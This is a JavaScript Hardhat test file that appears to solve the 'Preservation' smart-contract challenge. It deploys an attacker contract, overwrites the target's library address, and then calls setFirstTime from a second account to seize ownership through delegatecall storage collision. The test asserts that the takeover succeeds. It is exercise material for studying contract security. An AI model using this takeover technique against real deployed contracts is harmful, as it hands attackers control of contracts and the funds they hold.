const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Preservation", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();
    const LibraryContract = await ethers.getContractFactory("LibraryContract");
    const Library = await LibraryContract.deploy();
    await Library.deployed();
    const AttackPreservationContract = await ethers.getContractFactory(
      "AttackPreservation"
    );
    const AttackPreservation = await AttackPreservationContract.deploy();
    await AttackPreservation.deployed();
    const PreservationContract = await ethers.getContractFactory(
      "Preservation"
    );
    const Preservation = await PreservationContract.deploy(
      Library.address,
      AttackPreservation.address
    );
    await Preservation.deployed();

    return {
      owner,
      otherAccount,
      Preservation,
      Library,
      AttackPreservation,
    };
  }

  describe("Deployment", function () {
    it("Should Become the owner of the Preservation Contract", async function () {
      const { owner, otherAccount, Preservation, AttackPreservation } =
        await loadFixture(deployOneYearLockFixture);
      const Owner = await Preservation.owner();
      // update our malicious library
      await Preservation.setFirstTime(AttackPreservation.address);
      const librayUpdated = await Preservation.timeZone1Library();
      //Attack
      await Preservation.connect(otherAccount).setFirstTime(0);
      const newOwner = await Preservation.owner();
      console.log(Owner, newOwner);
      expect(librayUpdated).to.equal(AttackPreservation.address);
      expect(Owner).to.equal(owner.address);
      expect(newOwner).to.equal(otherAccount.address);
    });
  });
});
